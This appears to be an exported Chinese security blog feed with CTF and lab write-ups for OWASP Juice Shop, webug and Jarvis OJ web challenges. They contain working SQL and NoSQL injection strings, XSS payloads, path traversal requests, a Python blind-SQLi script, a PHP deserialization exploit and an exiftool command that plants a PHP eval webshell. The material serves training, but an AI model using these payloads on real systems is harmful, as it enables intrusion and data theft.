例子：比如加入一个网站用cookie作为身份验证，cookie通过xor加密而来，明文假设为usenam+role ,便可通过注册一个账号，推导出管理员的cookie常见解决方法，增加带有KEY的MAC,通过MAC验证密文是否被修改。通过哈希算法来实现的MAC，称为HMAC。3.弱随机数iv. 2.ECB模式缺陷简单的分组加密，改变分组密文的顺序，将改变解密后的明文顺序；替换某个分组密文，解密后该对应分组的明文也会被替换，而其他分组不受影响。 3.Padding Oracle Attack4.伪随机数问题伪随机数的破解伪随机数是由数学算法实现的，它真正随机的地方在于“种子”，种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得的值的顺序也是固定的。 5.Length Extension AttackDDOS攻击利用合理的请求造成资源过载，导致服务不可用。 粗略的整理一下，等以后接触更多了，再慢慢的补充。 参考文献:https://book.douban.com/subject/10546925/https://book.douban.com/subject/26673087/https://book.douban.com/subject/26348894/https://github.com/JnuSimba/MiscSecNotes]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledeg</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[owasp juice shop]]></title>
    <url>%2Fposts%2F6faad9f0.html</url>
    <content type="text"><![CDATA[闲来无事，搭个漏洞小靶场，玩一玩。 安装方法在ubuntu下安装1.先安装docker$sudo apt-get install docker 2.安装owasp juice shop$docker pull bkimminich/juice-shop 有点卡，下载失败可多次尝试3.运行 juice shop$docker run -d -p 3000:3000 bkimminich/juice-shop 4.访问虚拟机地址加3000端口 一颗星Score Board在首页，查看源码，看了挺久，终于在购物篮的页面上看到了一个Scorer-Board的链接，点击进去，成功解决。 Admin Section这关要求找到管理员的登入界面，用御剑等扫描一下没成功，直接根据任务的英文要求，输入administration，成功解决一关，看来要仔细读题目。 Confidential Document要求阅读机密文件。还是老思路先用扫描器扫一下还看一下有没有robots.txt，发现不行，到处找了，一下，偶然在关于我们的页面上发现了一些显眼的字眼 ，将其下载下来，一开始认为里面会有不可访问的页面，突然看到下载的链接http://192.168.20.132:3000/ftp/legal.md?md_debug=true 访问一下http://192.168.20.132:3000/ftp/ 成功 Deprecated Interface在投诉的页面上，提交一个xml小文件即可。具体原因查看源代码。 Error Handling这关要求引发一个错误，在解决Confidential Document 这关时，访问机密文件时，就引发了。 Five-Star Feedback在administration的管理页面中，就有删除五颗星的评分，就可以。 Redirects Tier 1XSS Tier 1实现xss，首先想到的是搜索框，直接输入&lt;script&gt;alert("XSS")&lt;/script&gt;. Zero Stars在联系我的页面上有个评价，评价时，使用bp抓包，修改一下就ok。 两颗星Basket AccessChristmas Special在搜索框上，输入1’，出现报错&#123; "error": &#123; "message": "SQLITE_ERROR: near \"'%'\": syntax error", "stack": "SequelizeDatabaseError: SQLITE_ERROR: near \"'%'\": syntax error\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)", "name": "SequelizeDatabaseError", "parent": &#123; "errno": 1, "code": "SQLITE_ERROR", "sql": "SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name" &#125;, "original": &#123; "errno": 1, "code": "SQLITE_ERROR", "sql": "SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name" &#125;, "sql": "SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name" &#125;&#125; 从报错的语句可以知道后台sql数据库查询语句。deletedAt该列的值为空的才会显示，而我们要加的是2014年的商品，肯定deletedAt值不为空，所以页面上显示不出来，通过构造查询语句注释掉deletedAt IS NULL，即可看到2014年圣诞节的商品。最终')) -- Forgotten Sales Backup只能下载md和pdf的文件，可以通过%00截断 http://192.168.20.132:3000/ftp/coupons_2013.md.bak%2500.md Login Admin在administration的管理页面中，可以知道管理员的登入账号为admin@juice-sh.op，弱口令猜测admin123,成功登入，解决此题和Password Strength Password Strength上题的方法解决 Reset Jim’s Password通过输入jim@juice-sh.op 邮箱，要社工查找Your eldest siblings middle name?名，查找得到George Samuel Kirk 输入Samuel，然后填密码即可。 Weird Crypto在联系我的页面中的评价中，填写base64编码即可。 三颗星Easter Egg Tier 1在ftp下的 eastere.gg，然后下载，将其中的一段密文base64解密，在访问其解密后的路径即可 Eye Candy开启JavaScript console 输入命令document.getElementById("theme").setAttribute("href","css/geo-bootstrap/swatch/bootstrap.css"); Forged FeedbackForgotten Developer Backuphttp://192.168.20.132:3000/package.json.bak％2500.md将最终解决挑战。 Login Benderbender@juice-sh.op'-- Login Bjoern暴力破解哈希不可能。官方答案说解密的方法，就在登入页面上的源码中一个dist/juice-shop.min.js链接里。密码为邮箱的base64加密。 Login Jim万能密码绕过jim@juice-sh.op' or 1 and 1 --+ Misplaced Signature Filehttp://192.168.20.132:3000/suspicious_errors.yml％2500.md NoSQL Injection Tier 1要求让服务器休眠一段时间.访问一下链接即可http://192.168.239.128:3000/rest/product/sleep(100)/reviews NoSQL Injection Tier 2同时更新所有的评论向http://192.168.20.132:3000/rest/product/reviews 提交patch请求。body为&#123; "id": &#123; "$ne": -1 &#125;, "message": "NoSQL Injection!" &#125; Headers为,其中Authorization,根据自己的去抓包值去修改。conent-type:application/jsonAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwNzY3MDQsImV4cCI6MTUyMTA5NDcwNH0.vSA_fSFw1-yrRLYJatnIKmJvXYgBtvdI5pZOI1UNCVZ6_qtQ-hS2ETsvm_gi1p_d3E39Czc-__2GTtaE582C9jlrAOxmYiDNuzeM9PHxa8kd7hb40EAs6srD17vE_HDlU0LE-4VBUScjLPoRXWjQXM8QFC3_D9Eyc6FAM--T8TQ` Payback TimeProduct TamperingReset Bender’s Password这道题需要社工，最后会查到Stop&#39;n&#39;Drop。 Retrieve Blueprint下载一个想设计文件通过3d打印去打。先下载一张图片。通过图片可知相机制造商为openscad，谷歌可知这个软件编辑的3d打印的格式为.stl，暴力破解http://192.168.239.128:3000/public/images/products/ 该目录下爆破.stl。看源码也知道有个JuiceShop.stl文件。 Typosquatting Tier 1在ftp下载package.json.bak 文件并打开，找到epilogue-js吗，百度去搜一下原因。在联系我们的页面上，提交epilogue-js的评论 Upload Size在投诉那里先上传一个小于100kb的.pdf文件， 通过bp抓包，修改为大于100kb小于200kb的。就ok Upload Type修改一下上一题的后缀名即可 User Credentials根据登入处的报错知道有 id,user,email字段&#123;"error":&#123;"message":"SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error","stack":"SequelizeDatabaseError: SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)","name":"SequelizeDatabaseError","parent":&#123;"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"&#125;,"original":&#123;"errno":1,"code":"SQLITE_ERROR","sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"&#125;,"sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"&#125;&#125; 在 Christmas Special这题上已经有过分析，要 Vulnerable LibraryXSS Tier 2实现存储行xss就要插入数据库，一开始在联系我们的评论界面上提交xss语句，进入后台查看，发现评论为空，全被过滤了，只好另寻他法。最后想到在注册用户那里，注册一个账户，页面上有js判断，不能直接插入，只好bp转包，将用户名改为 &lt;script&gt;alert(&quot;XSS2&quot;)&lt;/script&gt; ，返回数据包失败，从返回的消息，知道将双引号，加了反斜杠，最后构造&lt;script&gt;alert(\&quot;XSS\&quot;)&lt;/script&gt;,返回包成功，再访问administration页面，弹框成功。 XSS Tier 3根本不使用前端应用程序执行持续的XSS攻击。POST /api/Products HTTP/1.1Host: 192.168.20.132:3000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/jsonAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqoContent-Length: 82Cookie: continueCode=QbNz3wepgLV0eBH4urh8tnc8IqT1iBf7uKtwIbT7ibuEI7f9ZABKn9jYlaxZ; io=QvKEDdlKHoHGbeCDAABM; email=431774437%40qq.com; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqoX-Forwarded-For: 127.0.0.1, 127.0.0.1Connection: closeUpgrade-Insecure-Reque&#123;"name": "XSS3", "description": "&lt;script&gt;alert(\"XSS\")&lt;/script&gt;", "price": 47.11&#125; XXE Tier 1四颗星CSRF万能密码登入 ，通过bp抓包，可删除现有的current的，即可。GET /rest/user/change-password?current=4567\89\76&amp;new=123456&amp;repeat=123456 Easter Egg Tier 2JWT Issues Tier 1Login CISORedirects Tier 2在http://192.168.20.132:3000/ redirect？to = https：//github.com/bkimminich/juice-shop。 有个重定向。尝试重定向到一些无法识别的URL会因白名单验证而失败406 Error: Unrecognized target URL for redirect。卸下to参数（HTTP：//本地主机：3000 /重定向）将转而产生500 TypeError: Cannot read property ‘indexOf’ of undefined，其中indexOf表示在这样的白名单中的作品严重的缺陷。制作重定向网址，以便目标网址to带有包含白名单网址的自己的参数，例如http://192.168.20.132:3000/redirect?to=http://www.baidu.com?pwned=https://github.com/bkimminich/juice-shop 通过忘记密码机制重置本德的密码 Reset Bjoern’s PasswordTyposquatting Tier 2XSS Tier 4里就利用sanitize-html这个版本的漏洞，编号为CVE-2016-1000237，用google搜索。根据该版本的特征通过不递归绕过验证。在评论处，构造语句&lt;4script&gt;alert(“XSS”)&lt;/script&gt; XXE Tier 2感觉挺无聊的，等以后有空再玩。参考文章https://github.com/bkimminich/pwning-juice-shop/blob/master/appendix/solutions.md]]></content>
      <categories>
        <category>knowledge</category>
        <category>vulnerability</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>vulnerability </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webug 靶场]]></title>
    <url>%2Fposts%2F523c96b0.html</url>
    <content type="text"><![CDATA[这个靶场不错，可惜的是有些题目复现不出来，有些小问题。 渗透基础普通的get注入http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23 http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4%23 http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C6167),4%23 http://192.168.3.129/pentest/test/sqli/sqltamp.php?gid=1' union select 1,2,(select group_concat(flag) from flag),4%23 从图片中找到有用的信息只能看到123.txt, 此题有点问题 你看到了什么给了一个假的flag。用御剑扫一下网站找到test目录，提示说尝试将目录MD5加密一下，将其加密，再访问md5(test,32) = 098f6bcd4621d373cade4e832627b4f6md5(test,16) = 4621d373cade4e83 第二个md5加密访问，得到flag 告诉你了FLANG是五位数弱口令admin admin123尝试登入成功 一个优点小小的特殊的注入X-Forwarded-For的一个注入，用bp抓包，将X-Forwarded-For:后面的额数据删除掉，显示出正确的答案。X-Forwarded-For:order by 4 %23 X-Forwarded-For:union select 1,2,3,4 %23 X-Forwarded-For:union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4 %23 X-Forwarded-For:union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C6167),4 %23 X-Forwarded-For:union select 1,2,(select group_concat(flag) from flag),4 %23 这关需要RMB购买一开始有一个登入框，直接查看源码，发现可以直接访问后台连接，出现买书页面。支付逻辑问题，抓包后将价格改为负数，会提示不能白白拿书，将价格都改为0，购买成功.bill1=0&amp;bill2=0&amp;num1=10&amp;num2=10&amp;uid=1 越权用给的账户登入，修改密码的之后，bp抓包，将用户名改成admin，修改admin密码成功username=admin&amp;password1=123&amp;password2=123&amp;password3=123 CSRF用上一关的账号名登录，修改密码，bp抓包生成csrf界面，将此保存为html 管理员打开后就会更改其密码了 完成了CSRF url跳转熟悉的界面，查看源码&lt;!--&lt;a href="index.php?url=#"&gt;I&lt;/a&gt;--&gt; 构造index.php?url=www.baidu.com 成功跳转 文件下载后台出了点小问题,此题是任意文件下载 我和上题有点像此题也是任意文件下载，不过这题是post方式下载。post请求pic=../../../pentest/test/7/1/db/config.php&amp;submit=%E4%B8%8B%E8%BD%BD 我系统密码忘记了上传一句话，这里我上传了一句话，但是连接的时候却出现连接不上，有点怪。连接上了，就可以利用mimikatz读取管理员的账户密码了 xss点击页面上的666,连接上的666，显示在页面上，反射性xss,直接在id=后面加上xss语句即可。http://192.168.3.129/pentest/test/9/?id=%3Cscript%3Ealert(%27qianye%27)%3C/script%3E 192.168.3.129/pentest/test/9/?id=&lt;img src onerror=alert('qianye')&gt; 存储型xss在输入框中输入上面的xss语句即可。 什么？上传不了图片先正常上传一张jpg图片,然后抓包,将jpg后缀修改为php,过关。 明天双十一看别人的writeup说有源码，但表示查看源码时什么都没有，有点问题。看一下别人的源码，只要修改url,x-forwarded-for,referer就可以啦GET /pentest/test/12/?url=www.taobao.com HTTP/1.1Host: 192.168.3.129User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.3.129/pentest/test/12/Cookie: PHPSESSID=eh6c536efhrbjh9tbfupi72sd0X-Forwarded-For: 10.10.10.10Connection: closeUpgrade-Insecure-Requests: 1Referer: www.baidu.com 中级进阶出来一点东西这道题本身有点问题，不过知道是任意文件读取就行啦。读取boot.int,试一下，可以成功http://192.168.3.129/pentest/test/13/?country=../../../../../../boot.ini 提交方式是什么样的任意文件读取，变成post方式 我还是一个注入查看后台源码，才知道是host注入。Host: order by 4 Host: union select 1,2,3,4 Host: union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() Host: union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 Host: union select 1,2,3,flag from flag 看看pak逆向题不懂 时间盲注运行有点卡，附上脚本自己试一下吧 #coding:'utf-8'import requestsimport timeimport stringpayloads=string.printablelength=0result=''print('start')# 判断长度for i in range(1,33): startTime=time.time() url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(database())=%d,sleep(5),1)"%(i) #url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat(table_name) from information_schema.tables where table_schema=database())=%d,sleep(5),1)"%(i) #url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat(column_name) from information_schema.columns where table_schema= )=%d,sleep(5),1)"%(i) #url="http://192.168.3.129/pentest/test/time/?type=2 and if(length(select group_concat() from )=%d,sleep(5),1)"%(i) response=requests.get(url) if time.time()-startTime &gt;=5: length=i print("the database length is"+str(i))# 猜测print("start brute sql")for j in range(1,length+1): for k in payloads: startTime1=time.time() url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(database(),'%d',1)='%s',sleep(5),1)"%(j,k) #url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 1),'%d',1)='%s',sleep(5),1)"%(j,k) #url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(select group_concat(column_name) from information_schema.columns where table_name= ,'%d',1)='%s',sleep(5),1)"%(j,k) #url1="http://192.168.3.129/pentest/test/time/?type=2 and if(substr(select group_concat() from ,'%d',1)='%s',sleep(5),1)"%(j,k) response1=requests.get(url1) if time.time()-startTime1 &gt;=5: result+=k print(result) breakprint("result is:"+result) DZ论坛复现失败 aspcms复现失败 phpmyadmin]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvis oj web]]></title>
    <url>%2Fposts%2Fd4a99024.html</url>
    <content type="text"><![CDATA[jarvis oj 挺不错的ctf平台，有点难。 babyxss某大佬的解 basyphp从about中猜测是有git源码泄露，用githacker，得到泄露部分&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");assert("file_exists('$file')") or die("That file doesn't exist!");?&gt; 从源码中知道有命令执行漏洞，构造 http://web.jarvisoj.com:32798/?page=?page='.system("tac templates/flag.php").' register二次注入 inject输入index.php~http://web.jarvisoj.com:32794/index.php~ 得到源码&lt;?phprequire("config.php");$table = $_GET['table']?$_GET['table']:"test";$table = Filter($table);mysqli_query($mysqli,"desc `secret_&#123;$table&#125;`") or Hacker();$sql = "select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;";$ret = sql_query($sql);echo $ret[0];?&gt; 在desc secret_test 表名只要第一组反引号中的表名存在，第二组反引号中随便写都不会报错.爆数据库http://web.jarvisoj.com:32794/?table=test` `union select GROUP_CONCAT(schema_name) from information_schema.schemata limit 1,1 爆表名http://web.jarvisoj.com:32794/?table=test` `union select GROUP_CONCAT(table_name) from information_schema.tables where table_schema=0x363164333030 limit 1,1 爆列名?table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1 脱裤http://web.jarvisoj.com:32794/?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1 admin从robots.txt 中，范文不允许访问的路径，即可得到flag web?根据输入的Wrong Password!! 在app.js中定位到如下 js代码$.post("checkpass.json",t,function(t)&#123; self.checkpass(e)?self.setState(&#123; errmsg:"Success!!", errcolor:b.green400 &#125;):(self.setState(&#123; errmsg:"Wrong Password!!", errcolor:b.red400 &#125;),setTimeout(function()&#123; self.setState(&#123; errmsg:"" &#125;) &#125;,3e3))&#125;) 有个checkpass(e)，定位到该处得到r.checkpass=function()&#123; var e; return(e=r).__checkpass__REACT_HOT_LOADER__.apply(e,arguments)&#125; 发现一个线性方程&#123;key:"__checkpass__REACT_HOT_LOADER__", value:function(e)&#123; if(25!==e.length) return!1; for(var t=[],n=0;n&lt;25;n++) t.push(e.charCodeAt(n)); for(var r=[325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259], o=[[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135], [76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221], [218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230], [30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80], [134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45], [142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107], [229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249], [235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158], [37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98], [199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141], [212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119], [194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94], [110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208], [220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196], [190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40], [144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123], [158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236], [251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119], [192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196], [106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66], [154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214], [193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212], [164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235], [221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156], [236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]], n=0;n&lt;25;n++)&#123; for(var i=0,a=0;a&lt;25;a++) i+=t[a]*o[n][a]; if(i!==r[n]) return!1 &#125; return!0 &#125;&#125; 用py去接，两个线性方程相乘，取整然后，在转换成字符串拼接起来即可。import numpy as npfrom scipy.linalg import solveimport stringr=np.array([325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259])o=np.array([[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135], [76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221], [218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230], [30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80], [134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45], [142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107], [229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249], [235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158], [37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98], [199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141], [212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119], [194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94], [110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208], [220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196], [190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40], [144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123], [158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236], [251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119], [192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196], [106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66], [154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214], [193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212], [164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235], [221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156], [236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]])x=solve(o,r)print(x)flag=""for i in range(len(x)): char=chr(int(round(x[i]))) flag+=char print(char)print(flag) phpinfo&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; php反序列化总结建立一个html文件，写入&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt;&lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt;&lt;input type="file" name="file" /&gt;&lt;input type="submit" /&gt;&lt;/form&gt; scandirdirname序列化，然后将html文件上传的包的文件名修改为下面序列化的值加上|,为防止转义，在”上加入\。&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();class OowoO&#123; public $mdzz='var_dump(scandir(dirname(__FILE__))';&#125;$qianye=new OowoO();echo serialize($qianye);?&gt; 抓包文件名修改为------WebKitFormBoundaryCyObcbKufPxtAZ5QContent-Disposition: form-data; name="file"; filename="|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;"Content-Type: text/plain&lt;!-- UY BEGIN --&gt;&lt;div id="uyan_frame"&gt;&lt;/div&gt;&lt;script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2157721"&gt;&lt;/script&gt;&lt;!-- UY END --&gt;&lt;script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"&gt;&lt;/script&gt;------WebKitFormBoundaryCyObcbKufPxtAZ5Q-- 得到flag所在的文件。由phpino.php和flag文件在同一目录下，和phpinfo上的信息可知进一步修改文件名为|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125; 得到flag 图片上传漏洞CVE-2016-3714 - ImageMagick 命令执行分析访问test.php得到phpinfo的相关信息。看到imagickhttp://web.jarvisoj.com:32790/test.php 利用exiftool生成一句话木马exiftool -label="\"|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/y.php; \"" 1.png 然后上传文件的时候需要注意需要filetype=show或者filetype=win。在uploads上生成x.php上传后用菜刀链接。这里我一直上传，连接失败。好像被别人上传了删除脚本 PHPINFOxml注入实体攻击从源码中function XHR() &#123; var xhr; try &#123;xhr = new XMLHttpRequest();&#125; 